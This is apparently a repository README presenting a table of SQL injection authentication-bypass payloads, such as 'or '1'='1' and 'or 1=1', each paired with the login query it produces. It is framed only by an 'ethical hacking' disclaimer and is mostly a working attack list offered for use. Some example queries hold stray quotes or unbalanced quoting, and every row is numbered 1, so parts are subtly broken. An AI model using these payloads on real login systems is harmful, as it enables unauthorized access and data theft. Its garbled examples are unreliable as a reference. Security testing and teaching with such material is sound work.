## SQL INJECTION | PAYLOAD AND EXAMPLE QUERY

![https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red](https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red)

> ! Attention, This Repository For Ethical Hacking 

### Bypass SQL Always True

|NO  |PAYLOAD  | EXAMPLE QUERY |
|--|--|--|
| 1 | ```' or '1'='1``` |```SELECT * FROM user WHERE username = '' or '1'='1' AND password = '' or '1'='1';```|
| 1 | ```' or username!=''``` |```SELECT * FROM user WHERE username = '' or username!='' AND password = '' or password!='';```|
| 1 | ```' or FALSE!=TRUE``` |```SELECT * FROM user WHERE username = '' or FALSE!=TRUE AND password = '' or FALSE!=TRUE;```|
| 1 | ```' or TRUE=TRUE``` |```SELECT * FROM user WHERE username = '' or TRUE=TRUE AND password = '' or TRUE=TRUE";```|
| 1 | ```' or 1=1``` |```SELECT * FROM user WHERE username = '' or 1=1 AND password = '' or 1=1" ;```|
